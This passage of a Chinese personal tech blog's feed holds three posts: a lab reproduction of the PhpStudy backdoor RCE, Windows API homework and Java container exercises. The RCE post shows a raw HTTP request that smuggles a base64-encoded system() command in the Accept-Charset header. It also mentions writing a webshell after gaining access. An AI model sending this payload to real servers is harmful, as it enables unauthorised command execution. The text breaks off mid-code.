      <category term="套接字学习" scheme="/tags/%E5%A5%97%E6%8E%A5%E5%AD%97%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>PhpStudy RCE漏洞复现</title>
    <link href="/2019/10/31/PhpStudy_RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>/2019/10/31/PhpStudy_RCE漏洞复现/</id>
    <published>2019-10-31T15:20:50.000Z</published>
    <updated>2019-11-12T03:42:22.962Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PhpStudy-RCE漏洞复现"><a href="#PhpStudy-RCE漏洞复现" class="headerlink" title="PhpStudy RCE漏洞复现"></a>PhpStudy RCE漏洞复现</h2><p>PhpStudy后门时间出现了挺长一阵子了，我一直没有进行复现，今天尝试复现一下。</p><a id="more"></a> <hr><h4 id="查看漏洞是否存在"><a href="#查看漏洞是否存在" class="headerlink" title="查看漏洞是否存在"></a>查看漏洞是否存在</h4><p>(1)phpStudy20161103版本后门位置存在位置</p><blockquote><p>*\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll</p><p>*\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll</p></blockquote><p>(2)phpStudy20180211后门位置存在于：</p><blockquote><p>*:\PHPTutorial\PHP\PHP-5.2.17\ext\php_xmlrpc.dll</p><p>*:\PHPTutorial\PHP\PHP-5.4.45\ext\php_xmlrpc.dll</p></blockquote><p>查找dll文件中的”@eval”</p><p><img src="https://s2.ax1x.com/2019/10/31/KTUC7V.png" alt="查找结果"></p><p>可见存在后门在169行</p><blockquote><p>顺便说一下，Windows的powershell无法使用grep，所以只能用Select-String进行替代。</p></blockquote><p>以下为PowerShell中可以替代grep的三种命令，but亲测findstr不能用。</p><p><img src="https://s2.ax1x.com/2019/10/31/KTUo34.png" alt="findstr报错"></p><blockquote><p>findstr：           cat .\create.tf  |findstr alicloud_slb<br>where：            cat .\create.tf  |where {$_ -match “alicloud_slb”}<br>Select-String： Select-String “alicloud_slb” .\create.tf</p></blockquote><hr><h4 id="搭建PhpStudy靶机环境"><a href="#搭建PhpStudy靶机环境" class="headerlink" title="搭建PhpStudy靶机环境"></a>搭建PhpStudy靶机环境</h4><p>首先在靶机搭建phpstudy网站，在攻击机看是否可以访问</p><p><img src="https://s2.ax1x.com/2019/10/31/KTUTgJ.png" alt="phpinfo"></p><h4 id="验证过程"><a href="#验证过程" class="headerlink" title="验证过程"></a>验证过程</h4><p>攻击机开启bp进行抓包</p><blockquote><p>GET / HTTP/1.1</p><p>Host: 192.168.179.1</p><p>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;x64; rv:69.0) Gecko/20100101 Firefox/69.0</p><p>Accept:text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8</p><p>Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</p><p>Accept-Encoding: gzip,deflate</p><p>Accept-Charset:”commandbase64 string”</p><p>Connection: close</p><p>Upgrade-Insecure-Requests: 1</p><p>Cache-Control: max-age=0</p></blockquote><p>出现RCE漏洞的地方即Accept-Charset参数</p><p>system(“your command”);</p><p>将想要执行的命令放到your command中，对整条命令进行base64编码，放入Accept-Charset即可执行命令。</p><p>我连接超时了，结果发现是php_xmlrpc拓展没开，并且一定要保留请求体，在Cache-Control后面一定要至少敲两行回车，要不会请求超时。</p><p><img src="https://s2.ax1x.com/2019/10/31/KTUXE6.png" alt="结果"></p><p>然后直接一条龙，使用Phpstudy用户权限就是当前登陆用户权限，systeminfo看一波，netstat看一波端口，直接写webshell。(最近想再看看关于如何免杀，之前写的马msf12重编码依然被火绒拦……所以webshell这块之后再写)</p><p>之后顺便把后门删了(懒得搭windows虚拟机的我冒险用物理机以身试险)</p><p><img src="https://s2.ax1x.com/2019/10/31/KTUzCD.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;PhpStudy-RCE漏洞复现&quot;&gt;&lt;a href=&quot;#PhpStudy-RCE漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;PhpStudy RCE漏洞复现&quot;&gt;&lt;/a&gt;PhpStudy RCE漏洞复现&lt;/h2&gt;&lt;p&gt;PhpStudy后门时间出现了挺长一阵子了，我一直没有进行复现，今天尝试复现一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="漏洞复现" scheme="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Windows API编程</title>
    <link href="/2019/10/30/Windows%20API%E7%BC%96%E7%A8%8B/"/>
    <id>/2019/10/30/Windows API编程/</id>
    <published>2019-10-30T04:00:15.000Z</published>
    <updated>2019-11-12T03:42:44.560Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Windows-API编程"><a href="#Windows-API编程" class="headerlink" title="Windows API编程"></a>Windows API编程</h2><blockquote><p>题目：使用 Windows 核心 API 实现以下程序 </p><ol><li>程序 1：该程序能够创建一个本机的 OllyDbg 进程（使用 CreateProcess，显式指定 OllyDbg 可执行文件的路径） </li><li>程序 2：<br>a) 该程序能够创建一个线程，显示 MessageBox<br>b) 在以上子线程中，编程获得 kernel32.dll 在当前系统中的路径信息，作为内容显示在以上的 MessageBox 中<br>c) 在以上子线程中，编程获得子线程所加载 kernel32.dll 中的GetCurrentThreadId()函数的地址，调用该函数，获得子线程的线程编号，将线程编号连接到上一问的 kernel32.dll路径后面，再将连接结果字符串显示在 MessageBox 中</li></ol></blockquote><a id="more"></a> <hr><p>以下程序我使用的是Dev-C++ “TDM-GCC 4.9.2 32-bit Release”编译成功的。</p><blockquote><p>程序1解决方案<br>此题明白CreateProcess的参数即可<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR commandLine[] = TEXT(<span class="string">"C:\\Users\\dell\\Desktop\\常用\\吾爱破解专用版Ollydbg\\原版\\英文原版\\OLLYDBG.EXE"</span>);</span><br><span class="line">    STARTUPINFO si = &#123;<span class="keyword">sizeof</span>(si)&#125;;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    <span class="keyword">bool</span> bRet = CreateProcess(</span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//应用程序名称，指向启动进程的 exe 文件 </span></span><br><span class="line">        commandLine,<span class="comment">//命令行字符串，是启动进程的命令行中的参数。</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//进程的安全属性 ，指向 SECURITY_ATTRIBUTES 结构变量，是进程的安全属性，可以为 NULL 则使用默认的安全属性</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//线程的安全属性 ，指向 SECURITY_ATTRIBUTES 结构变量。 </span></span><br><span class="line">        FALSE,<span class="comment">/*是否继承父进程属性 ，表示新进程是否从调用进程处继承了句柄。如果参数的值为 TRUE，调用进程中的每一个可继</span></span><br><span class="line"><span class="comment">承的打开句柄都将被子进程继承。被继承的句柄与原进程拥有完全相同的值和访问权限；如果设为 FALSE，那么不继承。 */</span> </span><br><span class="line">        CREATE_NO_WINDOW,<span class="comment">//创建标志，表示进程的创建标志以及优先级控制。 </span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//指向新的环境块的指针，指向新进程的环境变量块，如果设置为 NULL，那么使用父进程的环境变量。 </span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//指向当前目录名的指针 ，指定创建后新进程的当前目录，如果设置为 NULL，那么就在父进程所在的当前目录。 </span></span><br><span class="line">        &amp;si,<span class="comment">// 传递给新进程的信息，指向一个 STARTUPINFO 结构，该结构里可以设定启动信息，可以设置为 NULL 。</span></span><br><span class="line">        &amp;pi<span class="comment">//进程返回的信息，指向一个 PROCESS_INFORMATION 结构，返回被创建进程的信息。</span></span><br><span class="line">);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><hr><blockquote><p>程序2解决方案<br>学会调用Windows api即可（面向搜索引擎编程），我注释写的很详尽了<br>但是有一点投机取巧，我没有使用Windows api去搜索kernel32.dll路径，我是获取系统路径，如果是windows系统，那么kernel32.dll一定会在System32文件夹中。正确的做法应该还要再加一步确定kernel32.dll是否在System32文件夹中。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">getDllFuncAddr</span><span class="params">(<span class="keyword">char</span>* dllName, <span class="keyword">char</span>* funcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HMODULE h = LoadLibrary(dllName);</span><br><span class="line"><span class="keyword">long</span> addr = (<span class="keyword">long</span>)GetProcAddress(h, funcName);</span><br><span class="line">FreeLibrary(h);</span><br><span class="line"><span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">Thread1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">long</span> address;</span><br><span class="line"><span class="keyword">int</span> number;</span><br><span class="line"><span class="keyword">char</span> str[<span class="number">10</span>]=<span class="string">"\0"</span>;</span><br><span class="line"><span class="keyword">char</span> path[MAX_PATH];</span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">"\\kernel32.dll;id="</span>; </span><br><span class="line"><span class="keyword">char</span> str1[] = <span class="string">"kernel32.dll"</span>;</span><br><span class="line"><span class="keyword">char</span> str2[] = <span class="string">"GetCurrentThreadId"</span>;</span><br><span class="line">    GetSystemDirectory(path,MAX_PATH);<span class="comment">/*获取当前系统路径*/</span></span><br><span class="line">    <span class="built_in">strcat</span>(path,name);<span class="comment">/*因为kernel32.dll一定在系统目录system32下，所以只需要获取system32路径即可*/</span></span><br><span class="line">address = getDllFuncAddr(str1, str2);<span class="comment">/*保存函数地址*/</span> </span><br><span class="line">number = ((<span class="keyword">long</span>(*)())address)();<span class="comment">/*把address强制转化为指针类型并用其调用函数*/</span> </span><br><span class="line">ltoa(number,str,<span class="number">10</span>); <span class="comment">/*把id号放入一个字符串*/</span> </span><br><span class="line"><span class="built_in">strcat</span>(path,str);<span class="comment">/*字符串连接*/</span> </span><br><span class="line">MessageBox ( <span class="literal">NULL</span>, TEXT (path), TEXT (<span class="string">"Win_prog"</span>), MB_OK ) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)Thread1,<span class="literal">NULL</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">HANDLE  CreateThread(</span></span><br><span class="line"><span class="comment">   LPSECURITY_ATTRIBUTES lpThreadAttributes, //线程安全性描述（一个结构体，一般是NULL）</span></span><br><span class="line"><span class="comment">   SIZE_T dwStackSize,                      //一种数值（栈深度，一般是0）   </span></span><br><span class="line"><span class="comment">   LPTHREAD_START_ROUTINE lpStartAddress,  //启动函数</span></span><br><span class="line"><span class="comment">   _In_opt_ __drv_aliasesMem LPVOID lpParameter, // 附加参数（一般为NULL）</span></span><br><span class="line"><span class="comment">    _In_ DWORD dwCreationFlags,          //运行参数（是否在创建完成后就启动线程</span></span><br><span class="line"><span class="comment">   _Out_opt_ LPDWORD lpThreadId   // 返回句柄（一般是0，或者是一个DWORD型变量的地址，别忘了&amp;）</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">/*防止主进程结束导致子线程被kill*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>参考资料：<br><strong> C语言 ( <em> ( void ( </em> ) ( ) ) 0 ) ( ) 的理解:<br><a href="https://blog.csdn.net/fengfeng0328/article/details/85949805" target="_blank" rel="noopener">https://blog.csdn.net/fengfeng0328/article/details/85949805</a> </strong><br><strong> 获取指定dll中的某个函数的地址:<br><a href="https://blog.csdn.net/leng_que/article/details/4668787" target="_blank" rel="noopener">https://blog.csdn.net/leng_que/article/details/4668787</a> </strong><br><strong> WindowsAPI使用详解——GetWindowsDirectory|GetSystemDirectory 获取操作系统文件夹的路径:<br><a href="https://www.cnblogs.com/callback/p/4248038.html" target="_blank" rel="noopener">https://www.cnblogs.com/callback/p/4248038.html</a> </strong></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Windows-API编程&quot;&gt;&lt;a href=&quot;#Windows-API编程&quot; class=&quot;headerlink&quot; title=&quot;Windows API编程&quot;&gt;&lt;/a&gt;Windows API编程&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;题目：使用 Windows 核心 API 实现以下程序 &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;程序 1：该程序能够创建一个本机的 OllyDbg 进程（使用 CreateProcess，显式指定 OllyDbg 可执行文件的路径） &lt;/li&gt;
&lt;li&gt;程序 2：&lt;br&gt;a) 该程序能够创建一个线程，显示 MessageBox&lt;br&gt;b) 在以上子线程中，编程获得 kernel32.dll 在当前系统中的路径信息，作为内容显示在以上的 MessageBox 中&lt;br&gt;c) 在以上子线程中，编程获得子线程所加载 kernel32.dll 中的GetCurrentThreadId()函数的地址，调用该函数，获得子线程的线程编号，将线程编号连接到上一问的 kernel32.dll路径后面，再将连接结果字符串显示在 MessageBox 中&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="开发相关" scheme="/categories/%E5%BC%80%E5%8F%91%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="Windows API编程" scheme="/tags/Windows-API%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Java-容器学习</title>
    <link href="/2019/10/28/Java-%E5%AE%B9%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>/2019/10/28/Java-容器学习/</id>
    <published>2019-10-28T03:39:15.000Z</published>
    <updated>2019-11-12T14:15:16.801Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java-容器学习"><a href="#Java-容器学习" class="headerlink" title="Java 容器学习"></a>Java 容器学习</h2><blockquote><p>容器，就是一种Java中的可以容纳各种对象的数据结构，容器可以储存各种对象：例如String、int都可以，如果不确定要让容器接受哪一种对象，可以使用泛型来替代。但是如果使用泛型，如果往容器里存Integer、String两种甚至更多种不同的对象，虽然编译器不会报错，但是会报出有安全问题警告，所以尽量还是直接指定存储哪一种对象，而非使用泛型。</p></blockquote><a id="more"></a><hr><blockquote><p>使用容器需要先import,容器都在java.uti中。<br>容器种类：<br>可以大概分为四种类型：List、Set、Map、迭代器等等。</p></blockquote><ul><li>列表（List）：</li></ul><p>定义：List<e>mylist = new ArrayList<e>();</e></e></p><ul><li>集合（Set）:</li></ul><p>定义：Set<integer>myset = new HashSet<integer>();<br>集合中不能有重复的元素</integer></integer></p><ul><li>映射（Map）</li></ul><p>定义：Map &lt;String,Integer&gt;keywords  = new HashMap&lt;String,Integer&gt;();<br>类似Python里面的字典，有键值对。</p><ul><li>迭代器</li></ul><p>定义：Iterator<string> it = actionSet.iterator();<br>使用迭代器可以方便的对容器里的内容进行遍历，因为容器不能通过下标等进行操作。</string></p><hr><blockquote><p>在JDK文档中查阅Stack接口，尝试用封装LinkedList的方式实现一个Stack容器<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">homework5_3</span>&lt;E&gt; <span class="title">extends</span> <span class="title">LinkedList</span>&lt;E&gt;&#123;</span></span><br><span class="line"><span class="keyword">private</span> LinkedList&lt;E&gt; LinkedListstack = <span class="keyword">new</span> LinkedList&lt;E&gt;();</span><br><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(LinkedListstack.isEmpty())</span><br><span class="line"><span class="keyword">return</span> null;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> LinkedListstack.removeLast();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">LinkedListstack.addLast(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> boolean <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> LinkedListstack.isEmpty();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">peek</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(isEmpty())&#123;</span><br><span class="line"><span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> LinkedListstack.getLast();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">homework5_3 <span class="built_in">stack</span> = <span class="keyword">new</span> homework5_3();</span><br><span class="line">System.out.println(<span class="string">"Push string \"test1\" \"test2\" to the Stack! "</span>);</span><br><span class="line"><span class="built_in">stack</span>.push(<span class="string">"test1"</span>);</span><br><span class="line"><span class="built_in">stack</span>.push(<span class="string">"test2"</span>);</span><br><span class="line">System.out.println(<span class="string">"Start function Peek:"</span> + <span class="built_in">stack</span>.peek());</span><br><span class="line">System.out.println(<span class="string">"Start function Pop"</span>);</span><br><span class="line"><span class="built_in">stack</span>.pop();</span><br><span class="line">System.out.println(<span class="string">"Start function Peek:"</span> + <span class="built_in">stack</span>.peek());</span><br><span class="line">System.out.println(<span class="string">"Start function Pop"</span>);</span><br><span class="line"><span class="built_in">stack</span>.pop();</span><br><span class="line">System.out.println(<span class="string">"Start function Peek:"</span> + <span class="built_in">stack</span>.peek());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>运行结果<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Push <span class="keyword">string</span> <span class="string">"test1"</span> <span class="string">"test2"</span> <span class="built_in">to</span> <span class="keyword">the</span> Stack!</span><br><span class="line">Start <span class="function"><span class="keyword">function</span> <span class="title">Peek</span>:<span class="title">test2</span></span></span><br><span class="line">Start <span class="function"><span class="keyword">function</span> <span class="title">Pop</span></span></span><br><span class="line">Start <span class="function"><span class="keyword">function</span> <span class="title">Peek</span>:<span class="title">test1</span></span></span><br><span class="line">Start <span class="function"><span class="keyword">function</span> <span class="title">Pop</span></span></span><br><span class="line">Start <span class="function"><span class="keyword">function</span> <span class="title">Peek</span>:<span class="title">null</span></span></span><br></pre></td></tr></table></figure></p></blockquote><hr><blockquote><p>使用LinkedList实现一个类，该类有一个方法，该方法接受一个字符串作为参数，依次读取字符串中的字符，每次遇到“+”号就将“+”后面的一个字符压入栈中，每次遇到“-”时就将当前栈顶的字符弹出并在控制台打印，直到字符串遍历完，最后输出栈上剩余内容。实现main（）方法调用这个方法，并输入字符串”+U+n+c—+e+r+t—+a=+i-+n+t+y—+-+r+u–+1+e+s—“，观察输出。<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.lang.<span class="keyword">String</span>;</span><br><span class="line"><span class="keyword">public</span> class homework5_4&lt;E&gt; extends LinkedList&lt;E&gt;&#123;</span><br><span class="line">LinkedList&lt;<span class="keyword">String</span>&gt; stack = <span class="keyword">new</span> LinkedList&lt;<span class="keyword">String</span>&gt;();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> check(<span class="keyword">String</span> s)&#123;</span><br><span class="line"><span class="built_in">char</span> str1 = <span class="string">'+'</span>;</span><br><span class="line"><span class="built_in">char</span> str2 = <span class="string">'-'</span>;</span><br><span class="line"><span class="built_in">char</span> tmp;</span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line"><span class="built_in">char</span> item = s.charAt(i);</span><br><span class="line"><span class="keyword">if</span>(item == str1)&#123;</span><br><span class="line"><span class="built_in">int</span> p = i+<span class="number">1</span>;</span><br><span class="line">tmp = s.charAt(p);</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">str</span> = <span class="keyword">String</span>.valueOf(tmp);</span><br><span class="line">stack.addLast(<span class="built_in">str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(item == str2)&#123;</span><br><span class="line">System.out.<span class="built_in">print</span>(stack.removeLast()+<span class="string">" "</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.<span class="built_in">println</span>(<span class="string">"\nStack:"</span>);</span><br><span class="line"><span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">System.out.<span class="built_in">print</span>(stack.removeLast()+<span class="string">" "</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) &#123;</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">str</span> = <span class="string">"+U+n+c---+e+r+t---+a-+i-+n+t+y---+-+r+u--+1+e+s---"</span>;</span><br><span class="line">homework5_4 homework = <span class="keyword">new</span> homework5_4();</span><br><span class="line">homework.check(<span class="built_in">str</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>运行结果<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c <span class="built_in">n</span> U <span class="built_in">t</span> r e a i y <span class="built_in">t</span> <span class="built_in">n</span> - u r s e <span class="number">1</span></span><br><span class="line">Sta<span class="symbol">ck:</span></span><br></pre></td></tr></table></figure></p></blockquote><hr><blockquote><p>学习第八章中的文件输入/输出方法，从例5-6的TestMap.java中读入语句，并进行词频统计。进一步改写程序，统计TestMap.java中的Java关键字出现频率，在统计时，创建一个Set存储所有的Java关键字，在判断一个字符串记号是否为关键字时访问该Set。<br>遇到的问题：<br>TestMap.java部分关键字识别不出来<br>解决：在某些关键字周围加上分隔符空格<br>TestMap.java<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> class TestMap&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">String</span>[] s=<span class="keyword">new</span> <span class="keyword">String</span>[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">s[<span class="number">0</span>]=<span class="string">"I have a dream that one day this nation will rise up, "</span></span><br><span class="line">+ <span class="string">"live up to the true meaning of its creed: "</span></span><br><span class="line">+ <span class="string">"\"We hold these truths to be self-evident; "</span></span><br><span class="line">+ <span class="string">"that all men are created equal.\""</span>;</span><br><span class="line">s[<span class="number">1</span>]=<span class="string">"I have a dream that one day on the red hills of Georgia "</span></span><br><span class="line">+ <span class="string">"the sons of former slaves and the sons of former slave-owners "</span></span><br><span class="line">+ <span class="string">"will be able to sit down together at the table of brotherhood."</span>;</span><br><span class="line">s[<span class="number">2</span>]=<span class="string">"I have a dream that one day even the state of Mississippi, "</span></span><br><span class="line">+ <span class="string">"a state sweltering with the heat of injustice, "</span></span><br><span class="line">+ <span class="string">"sweltering with the heat of oppression, "</span></span><br><span class="line">+ <span class="string">"will be transformed into an oasis of freedom and justice"</span>;</span><br><span class="line">s[<span class="number">3</span>]=<span class="string">"I have a dream that my four children will one day live in a nation "</span></span><br><span class="line">+ <span class="string">"where they will not be judged by the color if their skin "</span></span><br><span class="line">+ <span class="string">"but by the content of their character."</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args)&#123;</span><br><span class="line">Map&lt;<span class="keyword">String</span>,Integer&gt; statistics = <span class="keyword">new</span> <span class="keyword">HashMap</span>&lt;<span class="keyword">String</span>,Integer&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;s.length;i++)&#123;</span><br><span class="line">StringTokenizer st=<span 